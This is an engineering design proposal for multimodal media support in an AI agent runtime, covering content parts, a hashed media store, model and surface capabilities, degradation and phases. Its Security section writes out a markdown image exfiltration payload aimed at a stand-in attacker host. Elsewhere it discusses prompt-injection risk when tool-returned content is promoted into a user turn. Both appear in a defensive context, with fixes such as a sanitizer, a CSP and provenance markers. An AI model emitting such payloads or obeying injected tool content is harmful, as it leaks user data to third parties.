# Media: design

How images (and audio, video, PDFs, arbitrary files) get into a prompt, out of a
tool, through the loop, and onto a screen — without breaking the text-only
assumptions the runtime is built on today.

Status: proposal. Nothing here is built.

## Why now

Three places already have media in hand and throw it away, each with a comment
admitting it:

- **`packages/core/src/mcp/client.ts:253`** — `renderContent()` flattens an MCP
  tool result's `image` and `audio` blocks to the string
  `[image content (image/png)]`. The doc comment says why: *"the loop's tool
  results are text-only today."* Every MCP server that returns a screenshot,
  chart, or scanned page is already talking to us in a language we refuse to
  hear.
- **`packages/browser-mediator/src/mediator.ts:240`** — `screenshotMeta()` takes
  a real screenshot and returns `Captured ${buf.length} bytes. Mediator-owned;
  caller gets metadata only.` The bytes are discarded inside the function. A
  vision-capable browser agent is not merely unimplemented; it is
  unrepresentable.
- **`docs/context-assembly-design.md`**, under *Still open* — *"`Message.content`
  is `string | null`; a string-rendering assembler in core forecloses
  multimodal."*

Inbound is the same story from the other side. Discord messages carry
`attachments[]` and Slack events carry `files[]`; neither is read. A Slack
message that is *only* an image is not even delivered — `channel.ts:76` guards
on `!message.text` and drops the event before the agent exists.

So this is not a feature that would be nice to have. It is a hole that four
subsystems are already falling into, quietly, in production.

## Goals

1. A user can attach media to a prompt, from any surface that can carry it.
2. A tool can return media, or text, or structured data, or text *and* media.
3. Every render surface shows media as well as it can, and degrades honestly
   when it can't.
4. A model declares what modalities it accepts, and the runtime respects that
   instead of discovering it via a 400.
5. Adding a new modality later does not require editing a union in core.

## Non-goals

- **Generating** images. Nothing here makes an agent produce a picture; it makes
  an agent able to *see* one and *pass one along*. Output modalities are
  declared (goal 4) so the seam exists, but no image-generation provider ships
  with this.
- Editing, resizing, transcoding, or thumbnailing. No `sharp`, no native deps.
  A resize step can be added later behind the store seam if a provider's size
  cap demands it.
- A media library UI. Media is attached to conversations, not browsable as a
  collection.
- Streaming media (live audio in, video out). The content model would extend to
  it; the transport would not, and pretending otherwise would shape the types
  badly.

## What other systems do

Surveyed because the wheel is round already.

Checked against primary sources: Anthropic's `tool_result` block types, the
Responses-vs-Chat-Completions split, vLLM's refusal of media on a `tool`
message, the Vercel AI SDK's part and tool-output shapes, OpenRouter's modality
fields, and Gemini's inline-size cap. MCP's block set is corroborated in-tree —
`mcp/client.ts` already switches on exactly `text` / `resource` /
`resource_link` / `image` / `audio`.

Exact field *spellings* below are still worth re-reading against the vendor's
docs before writing an adapter; several of these APIs renamed things during
2025–26, and this table is here for the shape of the answer, not to be
copy-pasted into a request builder.

### Content is an array of positional blocks — everywhere

| System | Shape |
|---|---|
| Anthropic Messages | `content: string \| ContentBlock[]`, blocks `text` / `image` / `document` / `tool_use` / `tool_result`; sources are a discriminated union `base64` / `url` / `file` (Files API `file_id`) |
| OpenAI Responses | `content: []` with `input_text` / `input_image` / `input_file`; image by `file_id`, URL, or data URI |
| OpenAI Chat Completions | `content: []` with `text` / `image_url` (data URI allowed) |
| Google Gemini | `parts: []`, each part either inline base64 bytes or a Files API URI, both carrying a mime type. Inline is capped by a **20 MB total request size**; the Files API is the documented path for anything larger or reused |
| Vercel AI SDK | parts discriminated on `type`: `{type:'text', text}` and `{type:'file', mediaType, data}` — **one file part carrying a media type, no separate image part**; `UIMessage.parts` is the separate UI-facing shape |
| MCP | `CallToolResult.content: (TextContent \| ImageContent \| AudioContent \| ResourceLink \| EmbeddedResource)[]` |

Two things are unanimous and worth stating as constraints rather than
preferences:

**Position carries meaning.** "This image, then this question about it" is
encoded by block order. Any design that loses ordering loses the ability to ask
about two images distinctly.

**Every one of them separates the reference from the bytes.** Anthropic's
`file_id`, Gemini's Files API URI, OpenAI's `file_id`, and MCP's `resource_link`
all exist so a large payload is *named* in the conversation and fetched
elsewhere. Gemini puts a number on why: inline bytes are capped by a 20 MB total
request size, and the Files API is the documented escape. Nobody's durable
conversation record is made of base64 — which is the same conclusion
`capToolOutput` reaches from the other direction, since it head/tail-slices its
input and would cut a base64 string into garbage.

### On `<image:abc>` placeholders

The question in the brief — *"maybe it's just a reference like `<image:abc>` and
then you have `{ abc: [bytes] }` attached"* — describes a real thing, but not at
the layer it first appears to.

No production model API takes an in-text placeholder. Not one of the six above.
Ordering is positional, and a placeholder inside a text block is just characters
to a tokenizer; the model gets no image from it. Prompt-templating libraries
that offer placeholder syntax resolve them into positional blocks before the
request goes out.

But the *sidecar* half of the intuition is exactly right, and this design uses
it twice:

- **As storage.** `{ abc: [bytes] }` is a content-addressed store; `abc` is a
  hash. That is precisely the `file_id`/`fileUri` pattern, and it is what keeps
  base64 out of SQLite.
- **As a text projection.** When a surface genuinely cannot show an image — a
  text-only model, a plain terminal, a log line — something has to stand in for
  it, and `[image: chart.png 1024×768 #a1b2c3d4]` is that something.

The rule that falls out: **a placeholder is a rendering, never a transport.** It
is what a part looks like when flattened for a surface that can't do better, and
it is never parsed back out of text to reconstruct meaning. Reconstruction by
regex over model-authored text is how the room envelope already works
(`rooms/envelope.ts`), and it is not a mistake worth repeating on binary data.

### Tool results carrying media

The crunchy part, and the place providers actually disagree.

**Anthropic accepts it inline.** `tool_result.content` takes `text`, `image`,
`document`, and `search_result` blocks
([docs](https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls)):

```json
{"type": "tool_result", "tool_use_id": "toolu_…",
 "content": [{"type": "text", "text": "15 degrees"},
             {"type": "image", "source": {"type": "base64",
                                          "media_type": "image/jpeg",
                                          "data": "/9j/4AAQ…"}}]}
```

**Bedrock Converse accepts it inline.** `toolResult.content` takes
`text` / `image` / `document` / `json` blocks. Our `provider-bedrock` already
imports the SDK's `ContentBlock` union — it simply never constructs the image
variant (`provider.ts:84`).

**OpenAI Responses accepts it.** Function-call output may be an array of image
or file objects rather than a string.

**OpenAI Chat Completions does not.** A `tool` message's `content` is a string.
This is the one that matters most for us: the built-in `openai_compatible`
provider speaks Chat Completions, and so do vLLM, llama-swap, OpenRouter, and
DeepSeek — the entire local and budget path. vLLM is explicit about it, and
rejects an `image_url` part on a `role: "tool"` message with *"tool message
content only supports text content"*
([vllm-project/vllm#43203](https://github.com/vllm-project/vllm/issues/43203)),
even for a vision model that accepts the identical part on a `user` message.
The documented workaround is to return a short text result and send the image in
a **subsequent user message**.

So the split is not cloud-versus-local or old-versus-new. It runs *through* a
single provider package: `provider-openai` ships a Responses adapter that can
inline and a Chat Completions adapter that cannot. Capability therefore has to
resolve per model and per rung, never per provider class.

That workaround has a cost that the Anthropic docs name explicitly on the same
page as the shape above:

> Tool results often carry content from sources outside your control: web pages,
> inbound email, user uploads, third-party APIs. Treat that content as
> untrusted... Keep untrusted content inside `tool_result` blocks rather than
> `system` prompts or plain user `text` blocks.

Promoting a tool-returned image into a user turn moves attacker-influenceable
content from the quarantined position into the trusted one. So the fallback is
not free, and it is not automatic: it is a declared, per-model behaviour with a
label attached (see *Degradation*).

**How MCP clients handle the same split:** they hold the typed blocks and adapt
per provider — inline where the API allows it, a follow-up turn or a text
placeholder where it doesn't. That is the design being adopted here, because it
is the only one that survives a fallback chain whose rungs disagree.

### Capability declaration

- **OpenRouter** publishes `input_modalities` and `output_modalities` per model
  as string arrays (`"text"`, `"image"`, `"file"`, …), and lets you *filter the
  model list* by output modality.
- **LiteLLM** ships a static `model_cost` map with `supports_vision`.
- **Anthropic** exposes a `capabilities` field on the Models API
  (`GET /v1/models/{id}`).
- **Vercel AI SDK** carries per-model flags and downgrades URLs to bytes when a
  provider can't fetch them itself.

The pattern is uniform: a declaration, overridable, consulted *before* the
request. Nobody relies on the 400.

OpenRouter's filter is worth stealing later. `AIProvider.listModels()` returns
bare ids today (`providers/interface.ts:129`), which is why the setup wizard offers
free-text entry and no capability hint. A provider that can report modalities
alongside ids would let the wizard stop offering a text-only model to an agent
whose tools return screenshots. Out of scope here; noted so the `listModels`
signature is widened once rather than twice.

## The design

### One part type, not four

```ts
export type ContentPart =
  | { type: "text"; text: string }
  | { type: "media"; media: MediaRef; alt?: string };

export interface MediaRef {
  /** sha256 of the bytes, hex. The id IS the content. */
  id: string;
  mimeType: string;
  bytes: number;
  name?: string;
  width?: number;
  height?: number;
  /**
   * Where the bytes live when they are NOT in the store — an https URL the
   * provider may fetch itself. Unset means "ask the MediaStore".
   */
  url?: string;
}

export type MediaKind = "image" | "audio" | "video" | "document" | "other";
export function mediaKind(mimeType: string): MediaKind;
```

A single `media` variant rather than separate `image` / `audio` / `video` /
`document` variants, because goal 5 says a new modality must not require editing
a union in core. The mime type already carries the kind; every consumer that
cares — provider adapters, render surfaces — has to switch on mime anyway.
`mediaKind()` gives the ergonomics back without the coupling.

The closest framework-layer analogue reached the same conclusion independently:
the Vercel AI SDK has no image part. It has `{type:'file', mediaType, data}`,
and an image is a file whose `mediaType` starts with `image/`. That is this
design's `media` part with different spelling, arrived at by a project that
started with a separate image part and collapsed it.

Tradeoff, stated honestly: this is less idiomatic TypeScript than a wide
discriminated union, and it moves an exhaustiveness check from the compiler to a
function. That is the price of not having core know the list of modalities. MCP
made the opposite choice and has been adding block types ever since.

### Content is a sidecar, not a widening

`Message.content` stays `string | null`. A new optional field carries the parts:

```ts
export interface Message {
  role: "system" | "user" | "assistant" | "tool";
  content: string | null;   // text projection — always populated
  parts?: ContentPart[];    // authoritative when present
  toolCalls?: ToolCall[];
  toolCallId?: string;
  reasoning?: string;
}
```

**The invariant, which every consumer may rely on:** when `parts` is present it
is authoritative for anything sent to a provider, and `content` is a lossy text
projection of it, maintained by one helper. When `parts` is absent, `content` is
the whole truth.

Widening `content` to `string | ContentPart[] | null` is the more elegant model
and is what the vendor APIs do. It is rejected here for a specific reason:
`content` is read as a string in the compaction transcript builder
(`compact.ts:177`), the token estimator (`loop.ts:561`), the rewind excerpt
(`rewind.ts:80`), the repeat detector (`loop.ts:1655`), the SQLite writer, the
SSE encoder, and the UI. A union turns all of those into a migration that must
land in one commit. The sidecar lets each of them keep working on day one and be
upgraded in the phase that cares about it — and any that are never upgraded
degrade to a readable placeholder rather than to `[object Object]`.

Precedent: `reasoning?` was added exactly this way in #254 — persisted and
rendered, deliberately not sent to providers, no consumer forced to change.
Vercel AI SDK draws the same line between `UIMessage.parts` and
`ModelMessage.content`.

The risk of a sidecar is drift, and the risk of an optional field is that it
becomes decorative. Both are addressed under *Not another dead flag*.

### `ToolResult` gains parts, keeps `output`

```ts
export interface ToolResult {
  success: boolean;
  output: string;           // text projection — always populated
  parts?: ContentPart[];    // authoritative when present
  structured?: unknown;     // JSON result, when the tool has one
  error?: string;
  endsTurn?: boolean;
  endsTurnReason?: string;
}
```

Additive by necessity: **40 non-test files declare a `ToolResult` return type,
and they build it from 398 `success: true|false` literals across 42 files**
(counted on `main`). A required field would touch every one; an optional one
touches none.

`structured` answers the "JSON" half of the brief. It mirrors MCP's
`structuredContent`, which pairs a machine-readable payload with the text the
model reads. It is not sent to the model as a separate channel — models take
text and media — but it is what event subscribers, the UI, and workflow steps
should read instead of re-parsing `output`.

The Vercel AI SDK models the same three-way split as a tagged union on the
result itself — `output: {type:'json', value}` for a structured result,
`output: {type:'content', value: [...]}` for a multi-part one — rather than as
sibling fields. That is the cleaner shape and was not chosen here for the same
reason `content` is not widened: `output` is a `string` that 40 files already
build and the loop already caps, hashes, and logs. Sibling fields are what
"additive" costs. If `ToolResult` is ever redesigned wholesale, the tagged union
is the better target.

### The media store

A seam, with a default implementation, registered like every other backend:

```ts
export interface MediaStore {
  put(bytes: Buffer, meta: { mimeType: string; name?: string; sessionId?: string }): Promise<MediaRef>;
  get(id: string): Promise<{ ref: MediaRef; bytes: Buffer } | undefined>;
  stat(id: string): Promise<MediaRef | undefined>;
  /** For surfaces that hand out URLs rather than bytes. */
  urlFor?(id: string): string | undefined;
}
```

Default: bytes at `<TAI_HOME>/media/<ab>/<sha256>`, metadata in a `media` table.
This copies `documents` (metadata row in SQLite, bytes on disk) and generalizes
`tool-output.ts`'s `persistFullOutput`, which already hashes tool output with
sha256 and writes it under a content-addressed name. That function's doc comment
argues the case better than a new one could:

> Named by hash rather than timestamp on purpose. The loop's stuck-model
> detector compares consecutive tool results verbatim, so a marker carrying a
> unique path would make two identical results compare unequal and quietly
> disable that guard... Hashing also dedupes: the same payload written twice is
> one file.

Both properties are load-bearing here too. An agent that screenshots the same
unchanged screen three times produces one blob and three identical projections,
so `loop.ts:1713`'s repeat detector still fires. A UUID per capture would break
it silently, exactly as the comment warns `exec` already does.

Registered through `Registry<MediaStoreFactory>` so a deployment can swap in S3
or a CDN without core knowing the name of either.

**Retention is part of the feature, not a follow-up.** Screenshots accumulate
fast. `media.retentionDays` (default 30) plus a sweep that deletes blobs no live
session references, following the memory sweep's shape.

### Capabilities

Two independent axes. Both modelled on `RoomCapabilities`
(`rooms/types.ts:153`), which already establishes the house pattern and states
the intent: *"Callers feature-detect through this rather than duck-typing
methods, so an unsupported action fails with a clear message instead of a
TypeError."*

**What a model accepts:**

```ts
export interface ModelCapabilities {
  /** Mime types or globs accepted as input: ["text/*", "image/*"]. */
  input: string[];
  output: string[];
  /** How this model's API takes media inside a tool result. */
  toolResultMedia: "inline" | "follow-up" | "none";
  maxBytesPerItem?: number;
  maxItemsPerRequest?: number;
}
```

Declared on the provider as **a function of the model id, not a constant**:

```ts
export interface AIProvider {
  // …
  /** What this provider accepts for a given model. Omit to mean text-only. */
  capabilities?(model: string): ModelCapabilities;
}
```

A static field would be unable to describe the provider we already ship.
`provider-openai` registers a single provider id whose `OpenAIRouterProvider`
dispatches **per call, against `params.model`**, to a Responses adapter
(`inline`) or a Chat Completions adapter (`follow-up`). Its doc comment
(`router.ts:1`) makes the general argument better than this one does:

> which endpoint a request needs is a property of the *model*, and the model is
> not fixed at build time: an agent can pin its own, a per-call override can name
> another, and a fallback chain rung can carry a third. Choosing from
> `defaultModel` when the provider is constructed would silently send an
> overridden model to the wrong endpoint.

Capability has exactly that shape. A constant would be a second `supportsTools`:
a declaration that cannot express what is true, and so gets ignored.

Resolution order, most specific first: `ModelEntry.capabilities` in config →
`provider.capabilities(model)` → a conservative text-only default. `ModelEntry`
already has the precedent for per-rung overrides in `maxContextTokens`, and
config has to win because a local gateway serves whatever model was last loaded
under a name core cannot introspect.

**What a surface can show:**

```ts
export interface SurfaceCapabilities {
  inlineMedia: boolean;      // an HTML page, a Discord embed
  attachments: boolean;      // Discord files[], Slack files.upload
  links: boolean;            // can render a fetchable URL
  maxBytes?: number;
  mimeTypes?: string[];
}
```

`Channel` has no capability struct today; the closest thing is a hardcoded
`MAX_MESSAGE_LENGTH` copy-pasted into two `splitMessage` implementations
(2000 for Discord, 3000 for Slack). Those constants belong here too.

### Not another dead flag

`AIProvider.supportsTools` is declared on the interface, hard-set to `true` by
every provider, and **read by nothing that changes behaviour** — one evals
recorder and some contract assertions. It is a capability declaration that
declares into the void, and it is the exact failure mode this design is most at
risk of repeating.

Three rules, adopted as acceptance criteria rather than as good intentions:

1. **Capabilities are consulted before the request, at one place.**
   `chatWithFallback` (`loop.ts:190`) gains a pre-flight adaptation step. That
   function currently treats every failure identically — its own comment says a
   4xx is a legitimate reason to try the next rung — which means a
   "this model has no eyes" 400 is today indistinguishable from a rate limit.
2. **A phase that adds a declaration also adds its consumer.** No phase lands a
   field whose only reader is a test.
3. **`supportsTools` gets fixed in the same wave**, because it is the same bug at
   the same seam, and leaving it as the counter-example next to new code invites
   the next person to copy it.

### Degradation

One ladder, applied by whoever is about to hand content to something narrower
than itself.

**To a model** (`media.onUnsupported`, default `degrade`):

1. Model accepts the mime type → send it. Inline in the tool result when
   `toolResultMedia: "inline"`.
2. `toolResultMedia: "follow-up"` → short text in the tool result, media in the
   next user turn, **prefixed with a marker naming the originating tool**. This
   is the position the Anthropic guidance warns about; the marker is what keeps
   the provenance visible to the model rather than laundering tool output into a
   user turn.
3. Model has no eyes → replace the part with its text projection. Optionally
   enrich via OCR: `extract_document` already turns PDFs and images into text
   with `tesseract.js` / `pdf-parse`, both already optional deps. Off by default
   (`media.ocrFallback`), because OCR is slow and lossy and pretending a photo
   is its caption is its own kind of lie.
4. `onUnsupported: "skip-rung"` → don't degrade, try the next model in the
   chain. This is why the check belongs in `chatWithFallback` and not in the
   provider.

**To a surface:** inline → attachment → link → text projection. An HTML page
gets `<img>`; Discord and Slack get a file upload; a terminal gets
`[image: chart.png 1024×768] file:///…`; a log gets the projection alone.

Every rung is lossy in a different direction, so each one says what it did. A
silently dropped image is the worst outcome available and the current behaviour
in all four places named at the top.

### Inbound

There is no inbound message type to extend. `IncomingMessage`
(`channels/interface.ts:1`) is exported and **never constructed by anything** —
all 17 `runAgentLoop` call sites pass a bare `string`, each channel having
flattened its own way.

```ts
export interface InboundMessage {
  text: string;
  parts?: ContentPart[];
}
export function runAgentLoop(
  userMessage: string | InboundMessage,
  opts: AgentLoopOptions,
): Promise<string>;
```

A union, so all 17 call sites compile untouched and each surface adopts the
richer form when it has something to put in it. `IncomingMessage` is either
given a body or deleted; leaving a decorative interface next to a real one is
how the next reader learns the wrong thing.

## Phases

Each ships alone and is useful alone.

**P1 — The content model.** `ContentPart`, `MediaRef`, `mediaKind`, the
projection helpers, `MediaStore` + registry + disk implementation, the `media`
table and its sweep. `parts` added to `Message` and `ToolResult`. Nothing
produces or consumes parts yet. Pure addition; no behaviour change.
*Tier 1 (core).*

**P2 — Tools return media.** MCP's `renderContent` stops flattening and maps
`image` / `audio` / `resource` blocks to parts. `screenshotMeta` becomes
`screenshot` and returns the bytes it already has. Anthropic and Bedrock adapters
emit inline tool-result media; everything else degrades. `capToolOutput` learns
to cap the projection and leave parts alone.
**This is the phase that proves the model end to end** — a browser agent that can
see is the first thing that works, and it exercises store, projection, provider
mapping, and degradation in one path. *Tier 1 seam + tier 2 adapters.*

**P3 — Capabilities.** `ModelCapabilities`, `SurfaceCapabilities`,
`ModelEntry.capabilities`, resolution, and the `chatWithFallback` pre-flight.
Fix `supportsTools` while the seam is open. *Tier 1.*

**P4 — Inbound.** `InboundMessage`; Discord `attachments[]`; Slack `files[]`
plus the file-only-message fix; `POST /api/media` and `GET /api/media/:id`;
`POST /api/chat` accepts `mediaIds`; UI composer gets file / paste / drop.
*Tier 1 seam + tier 2 channels.*

**P5 — Outbound render.** `Channel.send` accepts `{ text, parts }`; Discord and
Slack upload attachments; UI renders image parts; CLI prints the projection plus
a path. **Ships with a markdown sanitizer and a CSP** — see below. *Tier 1 seam +
tier 2 channels.*

**P6 — Optional, unscheduled.** OCR fallback; iTerm2 / kitty inline images in the
CLI; audio and video adapters; a resize step for models with small size caps.

Config (`media.retentionDays`, `media.maxBytes`, `media.onUnsupported`,
`media.ocrFallback`) and per-model capability declarations are *tier 3* — they
live in a deployment's `config.yaml`, not here.

## Security

Media makes an existing hole load-bearing, so P5 cannot ship without closing it.

**The UI renders model output as `marked.parse()` into
`dangerouslySetInnerHTML`** (`MessageBubble.tsx:255`, `chips.tsx:56`) with **no
sanitizer in any package.json** and **no CSP anywhere in the server**. So
`![](http://attacker/?q=…)` written by a model — or by a web page a tool
fetched — already renders today and already exfiltrates on load. This predates
the proposal, but the proposal makes agents emit images routinely, which turns a
latent bug into a used code path.

P5 ships: a sanitizer on every `dangerouslySetInnerHTML` site, and a CSP with
`img-src 'self' data:` so a remote image cannot phone home.

Also required:

- **Sniff mime from magic bytes; never trust the declared type.** A client
  saying `image/png` over a 4 GB payload, or over HTML, decides nothing.
- **Cap size and count before `put`**, not after.
- **Never let the server fetch a model-supplied URL** without going through the
  existing egress policy. `browser-mediator/egress-policy.ts` is the prior art.
- Content addressing makes path traversal structurally impossible: the id is a
  hash, and a hash is never a path fragment the caller chose.

## What this breaks

Little, by construction — but not nothing.

- **Token estimation is wrong for media.** `estimateTokens` is
  `content.length / 4`; image tokens are non-linear in bytes. A part's
  projection is short, so the estimate *undercounts* badly, and undercounting
  makes the loop over-fill the window rather than under-fill it. P3 must add a
  per-part estimate — a declared per-image cost is enough to stop the estimate
  being a fiction.
- **Compaction sees projections, not images.** `compactSession` builds a text
  transcript; a compacted conversation loses its pictures. Correct for now
  (summarizing images is a different feature) but it means compaction is
  irreversibly lossy in a new way, and the tombstone work in
  `docs/context-assembly-design.md` step 3 should land first if that matters.
- **The SSE `tool_result` event truncates to 1000 chars**, at two separate call
  sites (`packages/server/src/index.ts:1045` and `:2314`). Fine for a projection,
  wrong for parts — P5 sends refs over SSE, never bytes, and must fix both.
- **`stripOrphanedToolMessages` and the follow-up-user-message strategy
  interact.** A tool-result image promoted to a user turn is a message with no
  `tool_call_id`, sitting between a tool result and the next assistant turn.
  Eviction must treat the pair atomically or the image outlives its context.
  P3 owns this.

## Open questions

- **Does `parts` go in a new `messages.parts` TEXT column, or a `message_parts`
  table?** A column matches how `tool_calls` and `reasoning` were added and is
  one idempotent `ALTER TABLE`. A table makes "which sessions reference this
  blob" a query instead of a scan, which the retention sweep wants. Leaning
  column for P1, with the sweep doing a scan until it hurts.
- **Should `structured` be sent to the model at all?** MCP servers that set
  `outputSchema` expect the client to show the model *something* structured.
  Serializing it into the text projection is the obvious answer and may be the
  wrong one.
- **Is `media.onUnsupported: "degrade"` the right default,** or should a vision
  agent hitting a text-only rung be a loud failure? Degrade is friendlier and
  hides a misconfiguration; skip-rung is honest and can empty a fallback chain.
- **Do rooms carry media?** `room_messages.content` is TEXT and the envelope is
  regex-parsed (`rooms/envelope.ts`). Agent-to-agent images are a real use case
  and a bigger change than it looks.
